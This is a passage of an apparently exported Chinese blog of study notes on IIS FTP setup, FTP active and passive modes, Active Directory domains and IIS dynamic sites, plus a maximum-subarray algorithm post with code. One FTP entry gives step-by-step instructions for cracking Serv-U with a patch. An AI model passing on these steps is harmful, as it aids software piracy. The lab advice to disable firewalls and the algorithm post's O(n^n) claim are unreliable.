实验一定要将服务器与客户机的防火墙关闭，一定记得关闭防火墙！！！ IIS 提供的 ftp 服务，默认使用 主动模式，也就是说如果客户机开了防火墙的话，服务器无法与之建立数据传输通道，最后只能看到子文件夹，不能访问其中的文件！！！ 权限没问题！","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"域2","date":"2020-08-19T07:33:30.000Z","path":"2020/08/19/2020.08.19 域2/","text":"部署安装活动目录12345678910111213141516171819202122232425262728293031323334353637383940411. 部署安装 win2008 虚拟机。配置静态 IP 地址。2. win2008 装管理工具，不需要从光盘中获取安装包. 1) 右击计算机 -&gt; 角色(服务器) -&gt; 添加角色 -&gt; DC服务 -&gt; 安装。 ##此方法不推荐使用，还有方法二 2) #方法二: 3) 安装&#x27;活动目录&#x27;： 0) 配置之前，不要给该计算机指定 DNS 和 网关，&#x27;只需要给一个固定IP就行了&#x27;。 给该服务器的计算机名改为 DC1。因为，AD配置完之后，会自动该计算机加入域。 1) win + r -&gt; &#x27;dcpromo&#x27; 该命令可进行安装/卸载 2) 高级模式不用勾选。 3) 如果没指定 DNS 的话，它会有一个是否在该计算机上安装 DNS。&#x27;一步一定要勾选&#x27;. 4) #域树: 如果当前有一个域，位于一棵树的根部 root，我们可以称之为&#x27;根域&#x27;。与根域相连的可能是若干个&#x27;子域&#x27;，子域与根域之间通过&#x27;专线&#x27;连接，现实中可能是公司内部建立的&#x27;独立通信线路&#x27;，以便&#x27;跨区域实现局域网&#x27;。而，根域可能是一个公司的总部，&#x27;子域可能&#x27;是一个公司在其他地区的&#x27;分部&#x27;，但是他们&#x27;同属一个域&#x27;。例如 根域域控: qf.com 子域域控: shanghai.qf.com(表示上海分布)。 #域林: 一个公司内部两个不太相关的业务，建立&#x27;两个独立&#x27;的&#x27;根域&#x27; ———— 如 weixin.com 和 qq.com 。两者都属于腾讯公司内部业务，但是互不包含，&#x27;都是根域级别&#x27;。两棵域树，或者&#x27;多棵域树的集合&#x27;，就是&#x27;域林&#x27;。一般，国内很少有公司使用域林管理结构，顶多就是域树级别。 5) 设置根域名：fn222.com，#与此同时也表示 DC 的计算机名为 fn222 6) 设置林功能级别：windows server 2003。也就是规定，整个林中，所有域服务器版本不能低于 win2003。 7) 设置域功能级别：windows server 2008。也就是规定，整个域中，所有子域服务器版本不能低于 win2008。 8) 设置数据库(活动目录AD)、日志、策略存储路径，这里选默认就好。 9) 设置 AD 还原密码，一般用不到。用来还原活动目录。 4) 重启安装完成后，登陆域 fn222/administrator 原来的 &#x27;本地管理员&#x27; 已经&#x27;升级&#x27;为 &#x27;域管理员&#x27;。 5) 查看管理工具，DNS管理工具，发现自动生成了一个域名解析区域，以及主机A记录。如果需要设置转发器，可以进行进一步修改。 6) 查看 &#x27;Active Director 用户和计算机&#x27;。&#x27;验证&#x27;Domain Controllers 和 Users中的分组。用户，管理员等&#x27;用户和组&#x27;都&#x27;升级&#x27;了，变成了&#x27;域用户，域组&#x27;。 Computer：普通域成员机列表 Domain Controller：DC列表 Users：域用户/组 3. #加入域添加成员机: 1) 配置 IP 与域控同属一个局域网；给员工计算机指定 DNS 到 域控地址。 2) 修改计算机属性，计算机名 -&gt; 更改 -&gt; 隶属于域 fn222.com -&gt; 使用域管理员登陆fn222.com/administrator。 3) 查看活动目录用户管理工具，是否新添加了 成员机。 4) 在活动目录用户管理工具 -&gt; user 中为该成员机添加一个 域用户。右击，添加用户，填写相应信息即可。用户登陆名一般为 &#x27;名.姓&#x27; eg: &#x27;ning.fang&#x27; @fn222 。 5) 成员机，使用&#x27;域用户&#x27;登陆计算机检查是否能够登陆成功。 &#x27;注意&#x27;: 一旦计算机处于域环境中: #那么 域管理员组 会自动加入本地计算机的 管理员adminitrators组。 #另外 域用户组 会自动加入本地计算机的 用户users组。 因此在设置一些访问控制列表权限的时候，一定要注意考虑这两个组的位置，以免权限产生相互影响。 相关经验 win2008管理中有一个角色表示的就是该服务器。 IP 地址后面接斜杠表示的是子网掩码。192.168.101.10 /24 。24 表示网段是前24位，255.255.255.0 Neat Download Manager 是真的牛逼。今天在github上下个东西，如果是单线程的话估计就 几k每秒 ，然后用这玩意，直接开32线程。这还不是最牛的，在一部分线程完成后，后面越下越慢，这时，只需要取消任务，然后在控制面版里面恢复该任务，直接可以重新建立线程，总线程可以超过32！！ 新建域之后，如果生产环境中，该服务器中 DNS 服务器一定要设置 转发器。不然，你家公司 dns服务器 每次都迭代查询太慢。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"域","date":"2020-08-17T07:33:30.000Z","path":"2020/08/17/2020.08.17 域/","text":"域123456789101112131415161718192021222324252627282930313233343536373839404142434445461. Domain 英文名。 1) 很多方面都需要用到域，并且域的重要性很高。或者说是，域管理器的重要性很高。就像，对于DHCP网络连接来讲，dhcp服务器很重要。 2) 越是大型的公司，对于域的依赖性也就越高。有些公司会专门聘请 域管理员，并且资薪也特别高。不过，这种职业需求很少。2. 对于内外环境: 1) 工作组：默认模式，特点是&#x27;人人平等&#x27;，但是不利于管理。 2) 域：&#x27;人人不平等&#x27;，可以&#x27;实现集中管理，统一管理&#x27;。3. 域的组成: 1) 域控制器：老大。是一种服务器，电脑，简称&#x27;域控&#x27; —— DC（Domain Contronller）。 2) 成员机：普通用户，相互平等。4. 域的部署: 1) 首先用一台服务器，安装域管理软件，这时，域就形成了。 但是，在形成之初，域中只有 DC，也就是域控一台计算机。 接下来，就需要一个个进行&#x27;加入域&#x27;操作。该操作只出现在公司成立之初，或者大型改造过程中。 2) 安装域控制器 ———— 就生成了域环境。 3) 安装活动目录 ———— 就生成了域控制器。以此，域的部署，要先从活动目录开始。 4) 活动目录：Active Directory == AD5. 拓扑图中，域用一个三角形显示 1) 每个域都有一个域名 ———— 一般以公司名命名，如 qf.com 2) 域中每台计算机的计算机名，其实也是一个主机名。如: 计算机名为 FANGING 那么，它在&#x27;域中的名字标识就是 FANGNING.qf.com&#x27; 并且 该域名与你这太计算机的 IP 地址进行绑定。 3) 这种功能&#x27;类似于 DNS域名解析服务器&#x27;，但是全过程不需要安装 DNS管理工具，也不需要添加 A记录。&#x27;全程自动完成&#x27;。可以说，&#x27;域控本身也是一台dns服务器&#x27;。 4) 域环境中，&#x27;只需要知道员工的姓名&#x27;，就可以知道他的域名，通过 dc 进行解析，&#x27;就可以知道他的 IP 地址&#x27;，通过交换机还可以知道他的 mac地址。公司内部的计算机，不能随意改动计算机名。 6. 活动目录特点: 1) 域控的&#x27;核心&#x27;，其实就是依赖于&#x27;活动目录&#x27;。所以，活动目录是&#x27;域环境中最重要的部分&#x27; ———— 集中/统一 管理。 2) 活动目录是一张表。存放着整个公司的&#x27;公共资源&#x27;，也成为&#x27;域资源&#x27;. (1) 域账号：区别于计算机的本地账号。可以&#x27;通过该域账号&#x27;，&#x27;登陆&#x27;处于域中的&#x27;成员机&#x27;. 1)首次通过域账号密码登陆成员机时，计算机&#x27;不会直接判断账号密码错误&#x27;。先会通过 DC域名 &#x27;解析出 DC地址&#x27; 2)然后，询问 DC，&#x27;活动目录中&#x27;，是否有该&#x27;域账号&#x27;，&#x27;进行核对&#x27;。如果有，那么成员机就会&#x27;允许&#x27;这个域账号进行登陆。 3)登陆成功后，成员机会在本地&#x27;创建&#x27;对应该账号的&#x27;家目录&#x27;。 (2) 存储企业内部所有&#x27;公共服务器地址&#x27;。一个企业中，有很多的服务器地址，例如域名解析服务器地址、动态主机配置服务器地址、ftp服务器地址、web服务器地址。这些地址很难记住，可以将其存储到活动目录中，创建一个成员机都可以访问的公共资源。这样&#x27;只需要记住活动目录地址&#x27;。7. 组策略 GPO: 1) 与活动目录配合，进行集中管理。组策略很强大，并且设计了很多很多条。 2) Group Policy ———— 组 策略 3) 一个组策略就像是一个&#x27;能实现某种功能的批处理指令&#x27;。它可以对活动目录中的一组域账号统一下达某种指令。 例如统一修改成员机桌面图标。只需要&#x27;在活动目录中&#x27;添加相应的&#x27;一条组策略&#x27;，然后&#x27;应用&#x27;就行了。8. 将计算机通过域账号登陆时: 1) 首先会&#x27;询问 DC&#x27;，是否对我下达了什么指令 2) DC 通过访问活动目录发现，该&#x27;成员机所属的分组内，有一条组策略&#x27;。 3) 该成员机通过读取该组策略，&#x27;就会按照要求执行&#x27;。 4) 这就实现了一种 集中/统一 管理。全靠活动目录！ 相关经验 关于 域 管理设置有一本书籍，专门来讲 域 管理。甚至，有一个专门的职业来进行这种管理。 我们普通电脑，右键属性看到计算机默认是处于工作组状态，公司环境的话，计算机是处于 域 管理状态。 可以，通过右击此电脑，属性中查看计算机所属环境。 一般公司内每个员工都需要配置一个域账号，并且每个员工都必须使用域账号登陆成员机。 按照 公司内部的组织架构 将成员机 域账号进行分组。如财务部、技术部、宣传部等等……","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"FTP服务器搭建2","date":"2020-08-16T14:30:30.000Z","path":"2020/08/16/2020.08.16 IIS 之 FTP 服务器2/","text":"FTP 服务器2ftp 主被动模式知识储备![ftp主被动模式过程](http://images.fangning.xyz//ftp 主被动模式过程.png)** 12345678910111213141516171819201. # 21 端口号：&#x27;控制&#x27;端口。传输控制信息，比如发送连接请求，请求连接密钥，提供用户登陆信息等等...... # 20 端口号：&#x27;数据&#x27;端口。传输数据甬道，上传文件数据 或者 下载数据的专用端口。2. 采取 主动连接模式 还是 被动连接模式 &#x27;由客户机决定&#x27;。通常在客户机发送第一个连接请求的时候说明。3. 主被动都是 &#x27;相对于的服务器而言&#x27; 的。 1) 主动：表示由&#x27;服务器来主动访问客户机的随机端口&#x27;，以此建立数据传输通道。 2) 被动：表示服务器产生一个用于数据传输的随机端口之后，&#x27;被客户机来访问&#x27;。4. 无论是主动，或者被动。连接 ftp 服务器的&#x27;客户机&#x27;，都&#x27;必须开放两个端口&#x27;用于文件传输服务。 1) 一个为控制端口，一个为数据端口。 2) 端口号&#x27;随机产生&#x27;，一般 &gt; 50000。5. 无论是主动，或者被动。&#x27;ftp 服务器&#x27;，都&#x27;必须打开 tcp21 ftp控制端口号&#x27;。用于传输控制信号。 1) 如果是&#x27;主动模式&#x27;，服务器还会在数据传输时，打开 &#x27;tcp20 号端口&#x27;，进行数据传输。 2) 如果是&#x27;被动模式&#x27;，服务器在数据传输时，只会提供一个 &#x27;&gt; 20000 的随机端口号&#x27;，进行数据传输。6. 一台计算机上，除了有特定功能的端口号外，其他没有使用的端口都是关闭的。并且&#x27;防火墙&#x27;会&#x27;拦截外部对这些端口的连接请求&#x27;。 1) 当然，防火墙&#x27;不会阻止&#x27;这些端口&#x27;对外发送连接请求&#x27;。只会拦截外部对内的请求。 2) 因此，如果本地&#x27;开了防火墙&#x27;，即使开放了&#x27;不常用的端口&#x27;，&#x27;外部&#x27;也&#x27;无法主动进行访问&#x27;。 总结12345671. 无论是主动/被动模式，&#x27;数据传输建立过程&#x27;，都可能被 客户端 或 服务器端 的&#x27;防火墙阻止&#x27;。2. &#x27;主动模式&#x27;中，如果&#x27;客户机开了防火墙&#x27;，那么会导致 ftp 连接失败。3. &#x27;被动模式&#x27;中，如果&#x27;服务器开了防火墙&#x27;，那么会导致 ftp 连接失败。4. 主动模式也称为&#x27;活动模式&#x27;。 相关知识 生产环境中，服务器肯定是要开防火墙的。所以，客户端在连接 ftp 服务器的时候，必须关闭防火墙，然后改 主动连接模式。 在一次 ftp 数据传输过程中，客户端的数据端口号是随机的，并且是不断变化的。 端口号状态： LISTENING：端口号打开，并且处于监听状态。 ESTABLISHED：established 表示该端口号正在被使用。 TIME_WAIT：我方主动断开连接，并且得到对方确认。处于该状态时，所占用的资源不会被释放。也就是端口号关闭了，但是新的连接不能调用这个空闲的端口号，仍处于占用状态。 CLOSE_WAIT：对方主动断开连接，或者网络状态异常。此时，需要我方主动调用 close() 函数关闭端口。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"分而治之","date":"2020-08-16T03:41:30.000Z","path":"2020/08/16/2020.08.16 最大子序列/","text":"分而治之思想——最大子序列和首先说一下自己O(n)算法的总体思路思路：一段序列的子序列，必须是连续的。要求最大的子序列，就是找出原序列中一段连续空间元素和最大应该是多少。 ​ 朴素算法是，枚举起始位置 i , 和终止位置 j。然后每次求 i ~ j的和，最终得到结果。该算法时间复杂度为O(n^n)，明显是不可取的。 ​ 要求和的话，肯定先想到前缀和，然后由于要找一段子序列的和，那么如果两个位置的前缀和相减，得到的不就是中间一段连续空间的和了嘛？需要添加一个数组 sum。 ​ 那么应该如何确定哪两个位置的前缀和相减呢？首先，肯定是后面的位置 j 减前面的位置 i，我们可以枚举每一个后面的位置 j。 ​ 那如何确定 i ？很显然，找小于 j 的最小的一个数，他们之间的差就一定最大。那么如何找最小的数？每次都遍历一遍太费时间。所以我们可以一遍找出所有位置之前所有元素中最小元素所在位置。这需要我们再添加一个数组 vis。 样例： 对于一个序列 -2 1 -3 4 -1 2 1 -5 4 求出它的前缀和： 0 -2 -1 -4 0 -1 1 2 -3 1 第 i 个位置表示的是它之前所有位置元素的和。 然后再求前缀和最小和所在位置：0 1 1 3 3 3 3 3 3 3 第 i 个位置表示包括该位置在内前 i+1 个前缀和最小的和所在位置。eg：第四个位置为3，是因为其缀和数组中，前四个元素最小元素下标是3，sum[3] = -4 is Min。 当 sum 数组中的 2 减 前面的 -4 得到的结果 6 最大，所以，最大子序列和就是 [3, 6] = 4 + -1 + 2 + 1 = 6。 代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int nums[1000], numsSize; int sum[1000], vis[1000]; // 空间复杂度有点大了 int i, ans; //输入 scanf(&quot;%d&quot;, &amp;numsSize); for( i = 0; i &lt; numsSize; i++) scanf(&quot;%d&quot;, &amp;nums[i]); //计算出前缀和数组。 for( i = 0; i &lt;= numsSize; i++ ) &#123; if(!i) sum[i] = 0; else sum[i] = sum[i-1] + nums[i-1]; printf(&quot;%d &quot;, sum[i]); &#125; putchar(&#x27;\\n&#x27;); //计算出前缀和数组中第前i+1个元素的最小元素所在位置。以该位置作为子序列的起点。 for( i = 0; i &lt; numsSize; i++ ) &#123; if(!i) vis[i] = i; else&#123; if(sum[i] &lt; sum[vis[i-1]]) vis[i] = i; else vis[i] = vis[i-1]; &#125; printf(&quot;%d &quot;, vis[i]); &#125; putchar(&#x27;\\n&#x27;); // 从最后一个元素的后一个位置开始，以该元素作为子序列的结束点。 for( i = numsSize; i &gt; 0; i--) &#123; int x = sum[i] - sum[vis[i-1]]; if(i == numsSize) ans = x; if(x &gt; ans) ans = x; //区间 [vis[i-1] , i-1] &#125; printf(&quot;%d\\n&quot;, ans); return 0;&#125;/**力扣测试结果：202 / 202 个通过测试用例状态：通过执行用时：4 ms 超过%99.11的C提交内存消耗：6.3 MB 超过%100.00的C提交注：该方法是自己第一时间想到的O(n)级算法。当然对于最大子序列和还有更好的分治算法。**/ 再探讨一下据说是最优的分而治之思想将区间[0 , n] 分为两段，左子区间[0, n/2] ，右子区间 [n/2+1, n]。维护每一段的四个量(这是最难想到的)： 对于区间 [l, r]， 维护： lsum : 以 l 为起始的最大子序列和。 rsum：以 r 为终点的最大子序列和。 isum：区间[l, r]的和。 msum：区间[l, r]的最大子序列和。 msum 可能是它的左子区间的msum， 也可能是它右子区间的msum。或者跨越两个区间，是左子区间的 rsum + 右子区间的 lsum。 lsum 可能是它左子区间的 lsum，或者跨越两个子区间，是左子区间的 isum + 右子区间的 rsum。 rsum 同理。 isum 易得。 12345678910111213141516171819202122232425262728293031class Solution &#123;public: struct Status &#123; int lSum, rSum, mSum, iSum; &#125;; Status pushUp(Status l, Status r) &#123; int iSum = l.iSum + r.iSum; int lSum = max(l.lSum, l.iSum + r.lSum); int rSum = max(r.rSum, r.iSum + l.rSum); int mSum = max(max(l.mSum, r.mSum), l.rSum + r.lSum); return (Status) &#123;lSum, rSum, mSum, iSum&#125;; &#125;; Status get(vector&lt;int&gt; &amp;a, int l, int r) &#123; if (l == r) return (Status) &#123;a[l], a[l], a[l], a[l]&#125;; int m = (l + r) &gt;&gt; 1; Status lSub = get(a, l, m); Status rSub = get(a, m + 1, r); return pushUp(lSub, rSub); &#125; int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; return get(nums, 0, nums.size() - 1).mSum; &#125;&#125;;作者：LeetCode-Solution链接：https://leetcode-cn.com/problems/maximum-subarray/solution/zui-da-zi-xu-he-by-leetcode-solution/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 其他方法哎，自己果然是最菜的。思维方式还是太朴素，没有真正掌握动态规划，和贪心思想的精髓和思维模式，思维方法。 这种题是很简单的，更好的算法是，动态规划O(n)的时间复杂度和O(1)的空间复杂度。还有贪心算法，也是O(n)和O(1)。不过空间开销略微比动态规划多一点。两种方法都远好于我自己想的。 动态规划：f(i) 表示以第 i 个数结尾的连续子数组的最大和。ans = max{ f(i) } | 0 &lt;= i &lt; sizeof(nums) 那如何求解 f(i) 呢？f(i) 需要考虑假设是否加上前一段 f(i-1)。当然是单 f(i-1)&gt;0 时，加上它才最优。 12345678910111213141516class Solution &#123;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; int pre = 0, maxAns = nums[0]; for (const auto &amp;x: nums) &#123; pre = max(pre + x, x); maxAns = max(maxAns, pre); &#125; return maxAns; &#125;&#125;;作者：LeetCode-Solution链接：https://leetcode-cn.com/problems/maximum-subarray/solution/zui-da-zi-xu-he-by-leetcode-solution/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 贪心算法：和动态规划思想差不多。每次遍历一遍，计算之前所有元素的和。 如果之前的元素和大于0，累加，判断是否更新更新 ans。 如果之前的元素和小于0，丢弃，只加本身，判断是否更新 ans。 12345678910class Solution: def maxSubArray(Self, nums:List[int]) -&gt; int: if not nums: return -2147483648 cur_sum = max_sum = nums[0] for i in range(1, len(nums)): cur_sum = max(nums[i], cur_sum + nums[i]) max_sum = max(cur_sum, max_sum) return max_sum","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"FTP服务器搭建","date":"2020-08-13T11:30:30.000Z","path":"2020/08/13/2020.08.13 IIS 之 FTP 服务器/","text":"FTP 服务器搭建FTP服务器 File Transfer Protocol：文件传输协议。 端口号： TCP 20 / 21 FTP 工作方式： 主动(活动)模式。 被动模式。 FTP 服务器部署123456789101112131415161718192021222324252627282930313233343536373839404142431. 设置好固定 IP 地址， 安装好 IIS 管理工具。2. 安装好 IIS 之后，实际上已经部署好了 FTP。并且 21 端口号已经打开。3. 此时的 ftp 默认部署路径是 c:\\inetpub\\ftproot 此时访问权限允许匿名访问，所以登陆不需要密码。# 一些优化骚操作：1. 修改默认 FTP 路径，可以任意指定。2. 将 &quot;网站主目录&quot; 设置成 FTP服务的 &quot;主目录&quot;。这样就弄通过共享，让别人来管理你的网站。# 完整部署步骤1. 打开 IIS 右键新建 FTP 站点。2. 绑定该服务器的 IP 地址 和 所用的端口号。 &quot;IP 和 端口号&quot; 就是 FTP 站点的两个必须满足的标识。3. 隔离用户设置页面暂时不需要进行修改，因为还没有接触到域。4. 添加 ftp 主目录。找个地方新建一个文件夹，然后作为 ftp 访问路径。5. 设置 ftp 权限。 # 注意，该权限与 share 共享权限同一等级。 # ftp权限 交 ntfs权限 = ftp用户权限。 1) 所以此处权限一般设置成完全控制，然后需要具体进行权限限制的话，&quot;再修改文件夹的ntfs权限就行&quot;。 2) 就好像设置文件共享权限一样。用户最终得到的权限，总是该服务的权限，与文件系统权限取的交集。 3) 最好不要给普通用户赋予修改权限，这样会导致文件被删除。一般修改权限以下所有权限就够用了。6. 注意别忘记取消 ftp站点 的匿名访问。 1) 这个设置是默认启动的，所有来宾都可以访问你的 ftp 站点。 2) 取消匿名后，在服务器内单独设置一个专门用来访问计算机 ftp 的用户。 3) 可以设个 ftp管理员，再设置个 ftp普通用户。 4) 如果是使用第三方软件搭建 FTP 服务器，&#x27;不需要设置系统用户&#x27;。软件本身，可以建立用户！7. 用户登陆的时候： 1) 和访问共享文件时，不同。这里计算机不会给你记住密码。也就是每次访问都需要输入账户密码进行登陆。 2) 访问共享文件时，如果需要切换账户，需要注销计算机。 访问 ftp 的话，可以直接重新在地址栏刷新一遍，再登陆新的账户就行。 或者在空白处右击，选择登陆，直接跳转到账户切换页面。 使用第三方软件部署 FTP123456789101112131415161718192021222324252627282930313233343536373839404142434445461. 有的时候如果是做一些轻量级的临时文件传输。用 u 盘太麻烦，可以直接搭建一个 ftp 服务器。 1) 但是如果安装 windows IIS 的话呢不太容易。所以，一些小 ftp软件 就特别好用。 2) 一键部署，一键赋权限。&#x27;不用管 ftp 权限，也不用管 ntfs 权限&#x27;。 3) 注意，使用第三方软件的时候，不能够冲突。 一个服务器，如果搭建多个 ftp 服务，会失败。 &#x27;因为 ip 和端口号 两个标识相同，会产生冲突。&#x27;2. 软件一：Slyar FTPserver v1.1 1) 超级方便快捷。一键启动ftp服务。 2) 打开该软件时，它自动获得计算机的最高权限，然后通过自动修改 ftp权限 和 ntfs权限。实现你需要赋予的权限。 3) 软件自带文件访问的用户，不需要在服务器新建ftp用户。 4) 不适合生产环境使用，连接的客户数量一多，可能就崩溃了。3. 软件二：Serv-U File Server 15.2.0 1) 下载地址 ：&quot; http://www.dayanzai.me/serv-ufileserver.html/comment-page-1#comments &quot; 本地路径：&quot; C:\\Users\\22157\\Downloads\\Compressed\\Serv-U FTPsetup + patch &quot; 使用参考教程：&quot;https://wenku.baidu.com/view/ecedabf0d05abe23482fb4daa58da0116c171fc4.html &quot; 2) 破解方法： 1) 下载安装正版。作为系统服务安装。&#x27;安装路径不要修改&#x27;。然后安装完成的时候，最后一步取消勾选&#x27;完成后运行软件&#x27;。 2) 此时千万不能直接运行软件。cmd-&gt;services.msc 找到 &#x27;Ser-U 服务，然后关闭&#x27;。 3) shift + ctrl + esc 打开任务管理器，关闭所有 &#x27;Ser 开头的进程&#x27;。 4) 将下载目录的的破解程序&#x27;patch&#x27;，复制到程序安装目录。 5) 运行破解程序，输入昵称和邮箱，&#x27;再勾选 key 复选框&#x27;，然后等级 patch 按钮。至此程序破解完毕。 6) 打开软件，如果没有提示使用日期剩余时间。则破解成功，否则需要卸载软件重新进行操作。 3) 使用方法： (1) 前提知识储备： 第三方软件，软件自身内部可以创建用来访问的 FTP 用户。而&#x27;不需要占用系统用户&#x27;。 第三方软件，一般都是在&#x27;创建用户的时候，给用户指定 FTP主目录&#x27;。因此，可以同时创建多个 FTP 站点。 第三方软件，一个用户在创建好时，会生成一个变量叫 &#x27;HOME&#x27;，用来代替主目录路径。也就是 %HOME% = 主目录 第三方软件，拥有&#x27;虚拟路径功能&#x27;。也就是，你可以指定，主目录以外的真实物理路径到你的 FTP主目录中。用户在访问ftp的时候，所看到的文件夹，或者文件。在真实环境中，不一定都是存在主目录中。 &#x27;使用场景&#x27;：多个主目录不同的ftp站点需要用访问同一个文件夹的时候，可以省去复制该文件的过程。只需给该文件夹&#x27;映射一个虚拟路径到各ftp主目录&#x27;。 第三方软件，在文件访问权限控制时，不需要考虑目录文件夹的 ntfs 权限。只需要在软件内设置就行了。如果主目录内各文件夹的访问权限不一致。需要&#x27;添加用户对个文件夹的单独权限设置，并且权限越严格的优先级应该设置越高，也就是访问控制列表里面位置需要越靠前&#x27;。 第三方软件中，一般给设置好用户名，访问密码，访问权限，以及主目录，还有各子文件夹的访问权限，以及虚拟路径。就可以了。如果有特别需要，可以修改访问端口号，甚至时通过域名进行访问，以及通过 IPv6 进行绑定。 (2) 该软件是通过 域-组-用户 进行管理的。所以，最开始需要新建一个域。 1. 新建域，输入域名 eg：&#x27;ftp.fangning.com&#x27; 2. 配置域，我们只需要做 file transfer 服务，不需要做文件共享服务，所以&#x27;去掉勾选 file sharing domain&#x27;。 3. 使用默认的端口号就行了。 4. 绑定的 ipv4 地址，如果你服务器有多个地址，全部绑定也可以，那样无论客户访问哪一个ip地址，&#x27;都会访问到你这个 ftp服务器&#x27;。一般情况下，绑定一个就行了。 5. 密码加密方式，使用默认的&#x27;使用服务器设置&#x27;单向加密就行了。 6. 此时服务器以及搭建好了，如果访问的用户不需要设置太多的话，可以不设置组管理。&#x27;直接添加用户管理&#x27;。 7. 点击用户 -&gt; 添加 -&gt; 设置用户信息。修改 &#x27;登陆ID、密码、根目录&#x27; 三项就像。 8. 设置权限，查看用户属性，目录访问，添加。路径填写可以&#x27;用 %HOME% 替代主目录&#x27;。必须要设置主目录的访问权限，可以单独设置子目录的访问权限。&#x27;必须遵守 严格的权限 优先级 也要 相对靠前 原则&#x27;。 9. 虚拟路径使用方法。 先在 &#x27;域 -&gt; 主目录 中添加一条虚拟路径&#x27;。填写物理路径，与虚拟路径就行了。如: G:\\ios ===&gt; %HOME%\\ios2 然后，再到需要设置虚拟路径的用户中，添加权限列表。&#x27;路径一定要填写真实路径&#x27;，如 G:\\ios 相关经验 网络共享用 两个 \\ 反斜杠开始。 本地资源管理器路径都用 \\ 反斜杠。 ftp 文件传输路径也用两个 / 斜杠开始。 浏览器域名地址都使用 / 斜杠。 xp 文件属性中，没有安全选项。可以修改。 重大发现 ftp 共享文件路径内的文件夹最好不要用中文命名，测试过如果用 xp 访问中文路径。会乱码。 设置一个用户没有修改权限，但是可以上传，列出，查看，下载。 这样子可以做到，用户不能随意删除ftp内的文件，只可以进行上传。 并且，用户自己上传的文件却可以进行删除，复改等操作。挺方便的。 部署 ftp 服务的软件有很多。官方使用 IIS 工具部署虽然免费了一点。但是稳定，更加安全，不会宕机。 如果知识临时使用 ftp 文件传输。可以选择一些轻量级的 ftp 共享软件。 操作简单，快捷。缺点：可能不太稳定。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器3","date":"2020-08-12T12:30:30.000Z","path":"2020/08/12/2020.08.12 IIS 之 Web 服务器3/","text":"IIS 之 Web 服务器3站点类型 静态网站： 一般由扩展名为 .html 或 .htm 构成。 无后台数据库。 只要是不能和数据库进行数据交换，够通，连接的网页统称为 静态网页。 动态网站：一般扩展名为 .asp 或 .php 等 asp 是微软自己的语言，由该语言开发的网站。一般情况下，只能在微软系统上发布。（Active Server Pages） ​ 在 IIS 中，点击 Web服务扩展，可以找到 asp 扩展进行启用。 php 是通用的脚本语言。Linux 上不能用 asp，只能 php。 有后台数据库，asp/php 语言所编写的程序用来连接 前台页面 或 者 后台数据库。 Html —–&gt; asp\\php ——&gt; 数据库表格 前端页面，触发需要修改数据库的功能。用到中间的 php 脚本程序，实现将数据与数据库交互。 如何发布动态网站1234567891011121314151. 在 DNS 服务器添加动态网站的 主机头。加域名解析。2. 在 IIS 管理工具中，新建网站。绑定服务器 IP，以及刚刚新建的域名。3. 勾选 &quot;允许运行脚本&quot; 权限。 勾选 &quot;允许执行&quot; 权限。 注意：一般情况下，&quot;写入 和 浏览 权限不能勾选&quot;。4. 选择网站原码文件夹，设置为主目录。 设置文档，添加/移动 首页到最上层。 注意：一般情况下，动态网页的首页命名为一般带有 index\\defult\\login 字样。5. 这个时候的 IIS 还不能编译动态语言脚本程序。需要点击 web 服务扩展，启用 asp 扩展。 windows 系统中，做到这步样子就可以正常访问网站了。因为 windows 自带数据库以及 asp脚本允许环境。 但是如果是 Linux 系统的话，还需要搭建 php编译环境 以及 MySql数据库环境。 网络路径相关123456789101112131415161718191. 对于一个网络路径 ：http://www.fangning.com/Admin/ad_login.asp 1) 前面的 http:// 表示该网站遵循 http 协议，使用默认端口号 80进行访问。 如果是 https:// 则表示使用 https 协议，使用默认端口号 tcp443 访问。 2) www.fangning.com 为域名，代表该网站所绑定的&quot;主目录&quot;。 3) 而后面的 &quot;/Admin/ad_login.asp&quot; ，则表示&quot;显示主目录下的 admin子目录 下的 ad_login.asp 网页！&quot;# 访问一个网络路径，实际上就是访问该网站所指定 主目录文件夹 中的 文件。# 网络路径和本地文件路径一样。访问需要 路径，权限。2. 一般一个网站会有两个主页。 1) 一个是用户正常浏览访问的主页。 2) 一个是负责维护、管理等内部负责人员登陆的管理主页。 3) 一般管理员访问的所有的有关管理的网页，都集中在一个叫 Admin 的子文件夹中。&quot;主目录\\Admin&quot;3. 用以上步骤部署的网站。所能访问的范围，只有主目录下的网页。&quot;不包括主目录下 子目录内的网页。&quot; 1) 也就是说如果直接在浏览器输入 &quot;www.fangning.com\\admin\\ad_login&quot;，访问管理员登陆页面。这样子是访问不了的，因为此时子目录内的网页还&quot;没有被赋予公开权限&quot;。 2) 在网站中，右击网站 -&gt; 属性 -&gt; 主目录 -&gt; 下方有一个配置 -&gt; 上方有一个选项 在应用程序配置中，勾选&quot;启用父路径&quot;。 这时候就可以在浏览器的地址栏访问网站主目录下的所有网页了。包括子文件中的网页。 数据库访问相关123456789101. ## 此处本来想写一个关于赋予 IIS 对 网站主目录文件夹 的修改权限。 修改主目录文件夹访问控制列表，添加 &quot;IIS，IUSR&quot; 